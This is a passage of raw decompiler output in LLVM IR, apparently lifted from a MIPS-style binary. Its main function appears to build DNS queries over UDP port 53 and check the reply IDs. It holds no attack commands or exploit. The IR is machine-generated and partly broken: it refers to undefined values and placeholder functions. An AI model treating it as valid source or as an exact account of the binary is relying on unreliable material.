  %v1_1000a81c = and i32 %v5_1000a7ec, 32
  %v3_1000a81c = icmp eq i32 %v1_1000a81c, 0
  br i1 %v3_1000a81c, label %dec_label_pc_1000a84c, label %dec_label_pc_1000a824

dec_label_pc_1000a824:                            ; preds = %dec_label_pc_1000a81c, %dec_label_pc_1000a810, %dec_label_pc_1000a808
  %v0_1000a7ac3 = phi i32 [ %v1_1000a814, %dec_label_pc_1000a81c ], [ %v1_1000a814, %dec_label_pc_1000a810 ], [ %v1_1000a808, %dec_label_pc_1000a808 ]
  %v1_1000a824 = mul i32 %v0_1000a824, 256
  %v1_1000a828 = add nuw nsw i32 %v0_1000a828, 1
  %v2_1000a82c = or i32 %v1_1000a82c, %v1_1000a824
  store i32 %v2_1000a82c, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000a828, 5
  br i1 %tmp10, label %dec_label_pc_1000a7ac, label %dec_label_pc_1000a838

dec_label_pc_1000a838:                            ; preds = %dec_label_pc_1000a824
  %v0_1000a838 = load i32, i32* @r4, align 4
  %v3_1000a838 = icmp eq i32 %v0_1000a838, 0
  %v0_1000a840 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a838, i32 %v0_1000a840)
  %v0_1000a844 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a844 = load i32, i32* @r4, align 4
  %v2_1000a844 = inttoptr i32 %v1_1000a844 to i32*
  store i32 %v0_1000a844, i32* %v2_1000a844, align 4
  ret i32 1

dec_label_pc_1000a84c:                            ; preds = %dec_label_pc_1000a800, %dec_label_pc_1000a81c, %dec_label_pc_1000a7ac, %dec_label_pc_1000a7cc, %dec_label_pc_1000a794
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000a82c, { 1, 0 }
  uselistorder i32 %v1_1000a828, { 1, 0 }
  uselistorder i32 %v0_1000a814, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000a84c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000a7ac, { 1, 0 }
}

define i32 @function_1000a854(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000a854:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_1000a858 = load i32, i32* @lr, align 4
  store i32 %v0_1000a858, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268478596, i32* @lr, align 4
  %v1_1000a880 = call i32 @function_10007cf0(i32 512)
  store i32 %v1_1000a880, i32* @r30, align 4
  store i32 268478608, i32* @lr, align 4
  %v1_1000a88c = call i32 @function_10007cf0(i32 1025)
  %v0_1000a890 = load i32, i32* @r30, align 4
  %v3_1000a890 = icmp eq i32 %v0_1000a890, 0
  store i32 %v1_1000a88c, i32* @r21, align 4
  br i1 %v3_1000a890, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000a89c

dec_label_pc_1000a89c:                            ; preds = %dec_label_pc_1000a854
  %v3_1000a89c = icmp eq i32 %v1_1000a88c, 0
  br i1 %v3_1000a89c, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000a8a4

dec_label_pc_1000a8a4:                            ; preds = %dec_label_pc_1000a89c
  %v0_1000a8a4 = load i32, i32* @r23, align 4
  %v3_1000a8a4 = icmp eq i32 %v0_1000a8a4, 0
  br i1 %v3_1000a8a4, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000a8ac

dec_label_pc_1000a8ac:                            ; preds = %dec_label_pc_1000a8a4
  %v0_1000a8ac = load i32, i32* %r14.global-to-local, align 4
  %v1_1000a8ac = inttoptr i32 %v0_1000a8ac to i8*
  %v2_1000a8ac = load i8, i8* %v1_1000a8ac, align 1
  %v3_1000a8ac = zext i8 %v2_1000a8ac to i32
  store i32 %v3_1000a8ac, i32* %r0.global-to-local, align 4
  %v3_1000a8b0 = icmp eq i8 %v2_1000a8ac, 0
  br i1 %v3_1000a8b0, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000a8b8

dec_label_pc_1000a8b8:                            ; preds = %dec_label_pc_1000a8ac
  store i32 %v0_1000a8ac, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  %v0_1000a8c0 = call i32 @function_10006ed8()
  %v0_1000a8c8 = load i32, i32* %r14.global-to-local, align 4
  %v2_1000a8c8 = add i32 %v0_1000a8c8, %v0_1000a8c0
  %v1_1000a8d0 = add i32 %v2_1000a8c8, -1
  %v2_1000a8d0 = inttoptr i32 %v1_1000a8d0 to i8*
  %v3_1000a8d0 = load i8, i8* %v2_1000a8d0, align 1
  %v4_1000a8d0 = zext i8 %v3_1000a8d0 to i32
  store i32 %v4_1000a8d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012b0c.295 to i32), i32* %r29.global-to-local, align 4
  %v2_1000a8d8 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_1000a8d8, i32* %r28.global-to-local, align 4
  store i32 %v2_1000a8d8, i32* @r3, align 4
  %v1_1000a8e4 = xor i32 %v4_1000a8d0, 46
  store i32 %v1_1000a8e4, i32* %r17.global-to-local, align 4
  %v0_1000a8e8 = call i32 @function_10008c84()
  %v0_1000a8f0 = call i32 @function_10008c7c()
  %v3_1000a8f8 = load i32, i32* @global_var_100104c4.296, align 4
  store i32 %v3_1000a8f8, i32* %r11.global-to-local, align 4
  %v3_1000a904 = load i16, i16* @global_var_100103dc.297, align 2
  %v4_1000a904 = zext i16 %v3_1000a904 to i32
  store i32 %v4_1000a904, i32* @r25, align 4
  %v1_1000a908 = load i32, i32* @r23, align 4
  store i32 %v2_1000a8d8, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_1000a908 = srem i32 %v3_1000a8f8, %v1_1000a908
  %v2_1000a924 = sub i32 %v3_1000a8f8, %v2_1000a908
  store i32 %v2_1000a924, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a908, i32* @r26, align 4
  %v0_1000a92c = call i32 @function_10008c84()
  %v0_1000ae40.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_1000ae40.pr19, 3
  br i1 %tmp57, label %dec_label_pc_1000a934.lr.ph.lr.ph, label %dec_label_pc_1000ae58

dec_label_pc_1000a934.lr.ph.lr.ph:                ; preds = %dec_label_pc_1000a8b8
  %v2_1000a94c = ptrtoint i32* %stack_var_-144 to i32
  %v2_1000aa60 = ptrtoint i32* %stack_var_-204 to i32
  %v2_1000aac0 = ptrtoint i16* %stack_var_-212 to i32
  %v2_1000ab04 = ptrtoint i32* %stack_var_-248 to i32
  %v3_1000ab60 = icmp eq i32 %tmp37, 0
  %v3_1000ab6c = icmp eq i32 %tmp36, 3
  %v2_1000abe8 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1000ac3c = ptrtoint i32* %stack_var_-184 to i32
  %v3_1000ac68 = icmp eq i32 %tmp33, 0
  %v3_1000abdc = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_1000a934.lr.ph

dec_label_pc_1000a934:                            ; preds = %dec_label_pc_1000a934.lr.ph, %dec_label_pc_1000aae4
  %v0_1000a934 = load i32, i32* @r19, align 4
  %v3_1000a934 = icmp eq i32 %v0_1000a934, -1
  br i1 %v3_1000a934, label %dec_label_pc_1000a944, label %dec_label_pc_1000a93c

dec_label_pc_1000a93c:                            ; preds = %dec_label_pc_1000a934
  store i32 268478788, i32* @lr, align 4
  %v1_1000a940 = call i32 @function_100048e0(i32 %v0_1000a934)
  br label %dec_label_pc_1000a944

dec_label_pc_1000a944:                            ; preds = %dec_label_pc_1000a934, %dec_label_pc_1000a93c
  store i32 %v2_1000a94c, i32* %r29.global-to-local, align 4
  %v0_1000a950 = load i32, i32* @r30, align 4
  store i32 268478808, i32* @lr, align 4
  %v3_1000a954 = call i32 @function_10006e28(i32 %v0_1000a950, i32 0, i32 512)
  store i32 268478824, i32* @lr, align 4
  %v3_1000a964 = call i32 @function_10006e28(i32 %v2_1000a94c, i32 0, i32 48)
  %v0_1000a968 = load i32, i32* @r25, align 4
  %v1_1000a968 = add i32 %v0_1000a968, 1
  %v1_1000a96c = urem i32 %v1_1000a968, 65536
  store i32 %v1_1000a96c, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000a978 = load i32, i32* @r30, align 4
  store i32 %v1_1000a96c, i32* %stack_var_-144, align 4
  %v4_1000a98c = call i32 @function_1000c2cc(i32* nonnull %stack_var_-144, i32 %v0_1000a978, i32 512)
  store i32 %v4_1000a98c, i32* %r28.global-to-local, align 4
  %v1_1000a990 = icmp slt i32 %v4_1000a98c, 0
  br i1 %v1_1000a990, label %dec_label_pc_1000ae58, label %dec_label_pc_1000a998

dec_label_pc_1000a998:                            ; preds = %dec_label_pc_1000a944
  %v0_1000a998 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_1000a998, i32* @r4, align 4
  %v0_1000a9a0 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268478892, i32* @lr, align 4
  %v4_1000a9a8 = call i32 @function_10007068(i32 %v0_1000a9a0, i32 %v0_1000a998, i32 1025)
  store i32 ptrtoint (i32* @global_var_100103e0.250 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000a8d8, i32* @r3, align 4
  %v0_1000a9c0 = call i32 @function_10008c84()
  %v0_1000a9c8 = call i32 @function_10008c7c()
  %v0_1000a9cc = load i32, i32* @r22, align 4
  %v1_1000a9cc = icmp slt i32 %v0_1000a9cc, 0
  %v0_1000a9d4 = load i32, i32* @r26, align 4
  %v1_1000a9d4 = mul i32 %v0_1000a9d4, 4
  store i32 %v1_1000a9d4, i32* %r0.global-to-local, align 4
  %v2_1000a9d8 = add i32 %v1_1000a9d4, %arg4
  %v3_1000a9d8 = inttoptr i32 %v2_1000a9d8 to i32*
  %v4_1000a9d8 = load i32, i32* %v3_1000a9d8, align 4
  store i32 %v4_1000a9d8, i32* %r29.global-to-local, align 4
  br i1 %v1_1000a9cc, label %dec_label_pc_1000aa20, label %dec_label_pc_1000a9e0

dec_label_pc_1000a9e0:                            ; preds = %dec_label_pc_1000a998
  %v3_1000a9e4 = load i32, i32* @global_var_100104cc.299, align 4
  store i32 %v3_1000a9e4, i32* %r0.global-to-local, align 4
  %v2_1000a9e8 = icmp slt i32 %v0_1000a9cc, %v3_1000a9e4
  br i1 %v2_1000a9e8, label %dec_label_pc_1000a9f0, label %dec_label_pc_1000aa20

dec_label_pc_1000a9f0:                            ; preds = %dec_label_pc_1000a9e0
  store i32 ptrtoint (i32* @global_var_1000f328.300 to i32), i32* @r4, align 4
  %v0_1000a9fc = load i32, i32* @r21, align 4
  store i32 268478980, i32* @lr, align 4
  %v4_1000aa00 = inttoptr i32 %v0_1000a9fc to i8*
  %v5_1000aa00 = call i32 @function_1000bac0(i8* %v4_1000aa00, i32 ptrtoint (i32* @global_var_1000f328.300 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_1000aa08 = load i32, i32* @r22, align 4
  %v1_1000aa08 = mul i32 %v0_1000aa08, 4
  store i32 %v1_1000aa08, i32* %r0.global-to-local, align 4
  %v2_1000aa10 = add i32 %v1_1000aa08, ptrtoint (i32* @global_var_10012d3c.301 to i32)
  %v3_1000aa10 = inttoptr i32 %v2_1000aa10 to i32*
  %v4_1000aa10 = load i32, i32* %v3_1000aa10, align 4
  store i32 %v4_1000aa10, i32* @r4, align 4
  %v0_1000aa14 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aa20.302 to i32), i32* @lr, align 4
  %v4_1000aa1c = inttoptr i32 %v0_1000aa14 to i8*
  %v5_1000aa1c = call i32 @function_1000bac0(i8* %v4_1000aa1c, i32 %v4_1000aa10, i32 1025, i32 ptrtoint (i32* @global_var_10012d3c.301 to i32))
  br label %dec_label_pc_1000aa20

dec_label_pc_1000aa20:                            ; preds = %dec_label_pc_1000a9e0, %dec_label_pc_1000a998, %dec_label_pc_1000a9f0
  store i32 %v2_1000a8d8, i32* @r3, align 4
  %v0_1000aa28 = call i32 @function_10008c84()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000aa34 = load i32, i32* @r30, align 4
  %v1_1000aa34 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000aa34 = add i32 %v1_1000aa34, %v0_1000aa34
  %v1_1000aa38 = sub i32 512, %v1_1000aa34
  %v0_1000aa40 = load i32, i32* @r21, align 4
  store i32 %v0_1000aa40, i32* %stack_var_-240, align 4
  store i32 268479052, i32* @lr, align 4
  %v4_1000aa48 = call i32 @function_1000c47c(i32* nonnull %stack_var_-240, i32 %v2_1000aa34, i32 %v1_1000aa38)
  store i32 %v4_1000aa48, i32* @r27, align 4
  %v1_1000aa4c = icmp slt i32 %v4_1000aa48, 0
  br i1 %v1_1000aa4c, label %dec_label_pc_1000ae58, label %dec_label_pc_1000aa54

dec_label_pc_1000aa54:                            ; preds = %dec_label_pc_1000aa20
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000aa5c = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268479084, i32* @lr, align 4
  %v3_1000aa68 = inttoptr i32 %v0_1000aa5c to i8*
  %v4_1000aa68 = call i32 @function_1000bcbc(i32 10, i8* %v3_1000aa68, i32 %v2_1000aa60)
  %tmp59 = icmp slt i32 %v4_1000aa68, 1
  br i1 %tmp59, label %dec_label_pc_1000aa7cthread-pre-split, label %dec_label_pc_1000aa74

dec_label_pc_1000aa74:                            ; preds = %dec_label_pc_1000aa54
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000aa7c

dec_label_pc_1000aa7cthread-pre-split:            ; preds = %dec_label_pc_1000aa54
  %v3_1000aa7c.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000aa7c

dec_label_pc_1000aa7c:                            ; preds = %dec_label_pc_1000aa7cthread-pre-split, %dec_label_pc_1000aa74
  %v3_1000aa7c = phi i16 [ %v3_1000aa7c.pr, %dec_label_pc_1000aa7cthread-pre-split ], [ 10, %dec_label_pc_1000aa74 ]
  %v3_1000aa80 = icmp eq i16 %v3_1000aa7c, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_1000aa80, label %dec_label_pc_1000aaa8, label %dec_label_pc_1000aa94

dec_label_pc_1000aa94:                            ; preds = %dec_label_pc_1000aa7c
  %v0_1000aa98 = load i32, i32* @r29, align 4
  store i32 268479140, i32* @lr, align 4
  %v1_1000aaa0 = call i32 @function_10007770(i32 %v0_1000aa98)
  %v3_1000aaa8.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000aaa8

dec_label_pc_1000aaa8:                            ; preds = %dec_label_pc_1000aa7c, %dec_label_pc_1000aa94
  %v3_1000aaa8 = phi i16 [ 10, %dec_label_pc_1000aa7c ], [ %v3_1000aaa8.pre, %dec_label_pc_1000aa94 ]
  %v4_1000aaa8 = sext i16 %v3_1000aaa8 to i32
  store i32 268479160, i32* @lr, align 4
  %v3_1000aab4 = call i32 @function_10007cbc(i32 %v4_1000aaa8, i32 2, i32 17)
  store i32 %v3_1000aab4, i32* @r19, align 4
  %v1_1000aab8 = icmp slt i32 %v3_1000aab4, 0
  br i1 %v1_1000aab8, label %dec_label_pc_1000aae4, label %dec_label_pc_1000aac0

dec_label_pc_1000aac0:                            ; preds = %dec_label_pc_1000aaa8
  store i32 268479180, i32* @lr, align 4
  %v3_1000aac8 = call i32 @function_10007ba4(i32 %v2_1000aac0, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_1000aac8, -1
  br i1 %tmp60, label %dec_label_pc_1000aaec, label %dec_label_pc_1000aad4

dec_label_pc_1000aad4:                            ; preds = %dec_label_pc_1000aac0
  %v0_1000aad4 = call i32 @function_10004b48()
  %v1_1000aad8 = inttoptr i32 %v0_1000aad4 to i32*
  %v2_1000aad8 = load i32, i32* %v1_1000aad8, align 4
  store i32 %v2_1000aad8, i32* %r0.global-to-local, align 4
  %v3_1000aadc = icmp eq i32 %v2_1000aad8, 101
  br i1 %v3_1000aadc, label %dec_label_pc_1000ae24, label %dec_label_pc_1000aae4

dec_label_pc_1000aae4:                            ; preds = %dec_label_pc_1000aad4, %dec_label_pc_1000aaa8
  %v0_1000aae4 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000aae4 = add i32 %v0_1000aae4, 1
  store i32 %v1_1000aae4, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_1000aae4, 3
  br i1 %tmp61, label %dec_label_pc_1000a934, label %dec_label_pc_1000ae58

dec_label_pc_1000aaec:                            ; preds = %dec_label_pc_1000aac0
  %v0_1000aaec = load i32, i32* @r28, align 4
  %v1_1000aaec = load i32, i32* @r27, align 4
  %v2_1000aaec = add i32 %v1_1000aaec, %v0_1000aaec
  %v0_1000aaf0 = load i32, i32* @r30, align 4
  %v0_1000aaf8 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_1000ab00.304 to i32), i32* @lr, align 4
  %v4_1000aafc = call i32 @function_1000b21c(i32 %v0_1000aaf8, i32 %v0_1000aaf0, i32 %v2_1000aaec, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000ab14 = load i32, i32* @r19, align 4
  store i32 %v0_1000ab14, i32* %stack_var_-248, align 4
  store i32 268479260, i32* @lr, align 4
  %v3_1000ab18 = call i32 @function_1000b5ac(i32 %v2_1000ab04, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_1000ab18, 1
  br i1 %tmp62, label %dec_label_pc_1000ae24, label %dec_label_pc_1000ab24

dec_label_pc_1000ab24:                            ; preds = %dec_label_pc_1000aaec
  %v0_1000ab24 = load i32, i32* @r19, align 4
  %v0_1000ab28 = load i32, i32* @r30, align 4
  store i32 268479288, i32* @lr, align 4
  %v4_1000ab34 = call i32 @function_10007c08(i32 %v0_1000ab24, i32 %v0_1000ab28, i32 512, i32 0)
  store i32 %v4_1000ab34, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_1000ab34, 12
  br i1 %tmp63, label %dec_label_pc_1000adcc, label %dec_label_pc_1000ab44

dec_label_pc_1000ab44:                            ; preds = %dec_label_pc_1000ab24
  %v0_1000ab44 = load i32, i32* @r30, align 4
  %v2_1000ab4c = inttoptr i32 %v0_1000ab44 to i8*
  %v3_1000ab4c = call i32 @function_1000c3b8(i8* %v2_1000ab4c, i32 %v2_1000a94c)
  %v3_1000ab50 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_1000ab50, i32* @r20, align 4
  %v1_1000ab54 = load i32, i32* @r25, align 4
  %v4_1000ab54 = icmp eq i32 %v3_1000ab50, %v1_1000ab54
  br i1 %v4_1000ab54, label %dec_label_pc_1000ab5c, label %dec_label_pc_1000adcc

dec_label_pc_1000ab5c:                            ; preds = %dec_label_pc_1000ab44
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ab60, label %dec_label_pc_1000adcc, label %dec_label_pc_1000ab68

dec_label_pc_1000ab68:                            ; preds = %dec_label_pc_1000ab5c
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ab6c, label %dec_label_pc_1000ab74, label %dec_label_pc_1000abdc

dec_label_pc_1000ab74:                            ; preds = %dec_label_pc_1000ab68
  %v0_1000ab74 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000ab74 = icmp eq i32 %v0_1000ab74, 0
  br i1 %v3_1000ab74, label %dec_label_pc_1000ab7c, label %dec_label_pc_1000abd0

dec_label_pc_1000ab7c:                            ; preds = %dec_label_pc_1000ab74
  store i32 ptrtoint (i32* @global_var_100103e0.250 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000a8d8, i32* %r28.global-to-local, align 4
  store i32 %v2_1000a8d8, i32* @r3, align 4
  %v0_1000ab98 = call i32 @function_10008c84()
  %v0_1000aba0 = call i32 @function_10008c7c()
  %v3_1000aba8 = load i32, i32* @global_var_100104cc.299, align 4
  store i32 %v2_1000a8d8, i32* @r3, align 4
  %v1_1000abb4 = add i32 %v3_1000aba8, -1
  store i32 %v1_1000abb4, i32* %r29.global-to-local, align 4
  %v0_1000abb8 = call i32 @function_10008c84()
  %v0_1000abbc = load i32, i32* @r22, align 4
  %v2_1000abbc = icmp slt i32 %v0_1000abbc, %v1_1000abb4
  br i1 %v2_1000abbc, label %dec_label_pc_1000abc4, label %dec_label_pc_1000abd0

dec_label_pc_1000abc4:                            ; preds = %dec_label_pc_1000ab7c
  %v1_1000abc4 = add i32 %v0_1000abbc, 1
  store i32 %v1_1000abc4, i32* @r22, align 4
  %v0_1000abc8 = load i32, i32* @r20, align 4
  store i32 %v0_1000abc8, i32* @r25, align 4
  br label %dec_label_pc_1000ae40thread-pre-split.backedge

dec_label_pc_1000abd0:                            ; preds = %dec_label_pc_1000ab7c, %dec_label_pc_1000ab74
  %v0_1000abd0 = call i32 @function_10009548()
  br label %dec_label_pc_1000ac04

dec_label_pc_1000abdc:                            ; preds = %dec_label_pc_1000ab68
  br i1 %v3_1000abdc, label %dec_label_pc_1000abe4, label %dec_label_pc_1000adcc

dec_label_pc_1000abe4:                            ; preds = %dec_label_pc_1000abdc
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1000abfc, label %dec_label_pc_1000abf0

dec_label_pc_1000abf0:                            ; preds = %dec_label_pc_1000abe4
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1000ac1c10 = load i32, i32* @r30, align 4
  store i32 %v0_1000ac1c10, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000ac0c

dec_label_pc_1000abfc:                            ; preds = %dec_label_pc_1000abe4
  %v0_1000abfc = call i32 @function_10009548()
  br label %dec_label_pc_1000ac04

dec_label_pc_1000ac04:                            ; preds = %dec_label_pc_1000abd0, %dec_label_pc_1000abfc
  %storemerge3 = phi i32 [ %v0_1000abfc, %dec_label_pc_1000abfc ], [ %v0_1000abd0, %dec_label_pc_1000abd0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1000abfc ], [ 1, %dec_label_pc_1000abd0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_1000ac04 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_1000ac04, align 4
  br label %dec_label_pc_1000ae68

dec_label_pc_1000ac0c:                            ; preds = %dec_label_pc_1000abf0, %dec_label_pc_1000ac0c
  %v0_1000ac1c14 = phi i32 [ %v0_1000ac1c10, %dec_label_pc_1000abf0 ], [ %v0_1000ac1c, %dec_label_pc_1000ac0c ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_1000abf0 ], [ %v2_1000ac10, %dec_label_pc_1000ac0c ]
  store i32 268479504, i32* @lr, align 4
  %v2_1000ac0c = call i32 @function_1000c4f8(i32 %v0_1000ac1c14, i32 %storemerge213)
  %v0_1000ac10 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000ac10 = add i32 %v0_1000ac10, %v2_1000ac0c
  %v0_1000ac20.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_1000ac10, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1000ac10, i32* @r4, align 4
  %v0_1000ac1c = load i32, i32* @r30, align 4
  store i32 %v0_1000ac1c, i32* @r3, align 4
  %v2_1000ac20 = icmp slt i32 %v0_1000ac20.pr, 1
  %v1_1000ac24 = add i32 %v0_1000ac20.pr, 1
  store i32 %v1_1000ac24, i32* %r29.global-to-local, align 4
  br i1 %v2_1000ac20, label %dec_label_pc_1000ac0c, label %dec_label_pc_1000ac2c

dec_label_pc_1000ac2c:                            ; preds = %dec_label_pc_1000ac0c
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_1000abe8, label %dec_label_pc_1000ad78, label %dec_label_pc_1000ad80

dec_label_pc_1000ac3c:                            ; preds = %dec_label_pc_1000ad78
  store i32 %v2_1000ac3c, i32* %r29.global-to-local, align 4
  %v0_1000ac40 = load i32, i32* @r30, align 4
  store i32 268479572, i32* @lr, align 4
  %v5_1000ac50 = call i32 @function_1000c524(i32 %v0_1000ac40, i32 %v0_1000ac44, i32 %v1_1000ad78, i32* nonnull %stack_var_-184)
  store i32 %v5_1000ac50, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_1000ac50, -1
  br i1 %tmp64, label %dec_label_pc_1000ac74, label %dec_label_pc_1000ac5c

dec_label_pc_1000ac5c:                            ; preds = %dec_label_pc_1000ac3c
  %v0_1000ac5c = load i32, i32* @r24, align 4
  %v3_1000ac5c = icmp eq i32 %v0_1000ac5c, 0
  br i1 %v3_1000ac5c, label %dec_label_pc_1000adcc, label %dec_label_pc_1000ac64

dec_label_pc_1000ac64:                            ; preds = %dec_label_pc_1000ac5c
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ac68, label %dec_label_pc_1000adcc, label %dec_label_pc_1000ad80

dec_label_pc_1000ac74:                            ; preds = %dec_label_pc_1000ac3c
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_1000ac78 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_1000ac78, label %dec_label_pc_1000ad1c, label %dec_label_pc_1000ac80

dec_label_pc_1000ac80:                            ; preds = %dec_label_pc_1000ac74
  %v0_1000ac80 = load i32, i32* @r31, align 4
  store i32 %v2_1000ac3c, i32* @r4, align 4
  %v1_1000ac88 = add i32 %v0_1000ac80, 28
  %v2_1000ac88 = inttoptr i32 %v1_1000ac88 to i32*
  %v3_1000ac88 = load i32, i32* %v2_1000ac88, align 4
  store i32 %v3_1000ac88, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ac80, i32* @r3, align 4
  %v1_1000ac90 = add i32 %v0_1000ac80, 36
  %v2_1000ac90 = inttoptr i32 %v1_1000ac90 to i32*
  %v3_1000ac90 = load i32, i32* %v2_1000ac90, align 4
  store i32 %v3_1000ac90, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268479656, i32* @lr, align 4
  %v0_1000aca4 = call i32 @function_10006d8c()
  %v0_1000aca8 = load i32, i32* @r31, align 4
  %v1_1000aca8 = add i32 %v0_1000aca8, 4
  %v2_1000aca8 = inttoptr i32 %v1_1000aca8 to i32*
  %v3_1000aca8 = load i32, i32* %v2_1000aca8, align 4
  %v3_1000acac = icmp eq i32 %v3_1000aca8, 24
  br i1 %v3_1000acac, label %dec_label_pc_1000ac80.dec_label_pc_1000acd0_crit_edge, label %dec_label_pc_1000acb4

dec_label_pc_1000ac80.dec_label_pc_1000acd0_crit_edge: ; preds = %dec_label_pc_1000ac80
  %v1_1000acd0.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000acd0

dec_label_pc_1000acb4:                            ; preds = %dec_label_pc_1000ac80
  %v1_1000acb4 = add i32 %v0_1000aca8, 28
  %v2_1000acb4 = inttoptr i32 %v1_1000acb4 to i32*
  %v3_1000acb4 = load i32, i32* %v2_1000acb4, align 4
  store i32 %v3_1000acb4, i32* %r0.global-to-local, align 4
  %v3_1000acb8 = icmp eq i32 %v3_1000acb4, 0
  br i1 %v3_1000acb8, label %dec_label_pc_1000ad80, label %dec_label_pc_1000acc0

dec_label_pc_1000acc0:                            ; preds = %dec_label_pc_1000acb4
  %v0_1000acc0 = load i32, i32* %r16.global-to-local, align 4
  %v3_1000acc0 = icmp eq i32 %v0_1000acc0, 1
  br i1 %v3_1000acc0, label %dec_label_pc_1000acd0, label %dec_label_pc_1000acc8

dec_label_pc_1000acc8:                            ; preds = %dec_label_pc_1000acc0
  %v3_1000acc8 = icmp eq i32 %v0_1000acc0, 28
  br i1 %v3_1000acc8, label %dec_label_pc_1000acd0, label %dec_label_pc_1000ad80

dec_label_pc_1000acd0:                            ; preds = %dec_label_pc_1000ac80.dec_label_pc_1000acd0_crit_edge, %dec_label_pc_1000acc8, %dec_label_pc_1000acc0
